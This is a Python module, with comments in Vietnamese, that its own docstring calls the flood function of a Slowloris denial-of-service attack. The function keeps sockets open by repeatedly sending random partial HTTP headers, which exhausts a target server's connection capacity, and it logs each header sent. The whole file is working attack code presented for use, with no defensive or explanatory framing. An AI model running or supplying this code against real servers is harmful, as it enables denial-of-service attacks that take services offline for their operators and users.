"""This module provides the flood function for a Slowloris DoS attack.""" 

import random
import socket
import logging
from colorama import Fore as F

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def flood(sock: socket.SocketType) -> None:
    """Keep the socket alive in a Slowloris flood attack.

    Args:
        sock (socket.SocketType): The socket to be kept alive.

    Returns:
        None
    """
    try:
        # Lấy địa chỉ IP và cổng của socket hiện tại
        laddr, port = sock.getsockname()
        
        # Tạo một header ngẫu nhiên và gửi qua socket
        random_header = random.randint(1, 5000)
        sock.send(f"X-a: {random_header}\r\n".encode("utf-8"))
        
        # Tạo thông báo cho header đã gửi
        header_sent = f"Header Sent: X-a {random_header:>4}"
        logging.info("Socket: %s:%s | %s", laddr, port, header_sent)
        
    except (BrokenPipeError, socket.error) as e:
        logging.error("%s[!] Socket error: %s%s", F.RED, e, F.RESET)
        try:
            sock.close()
            logging.info("Socket closed successfully.")
        except Exception as close_err:
            logging.error("%s[!] Error closing socket: %s%s", F.RED, close_err, F.RESET)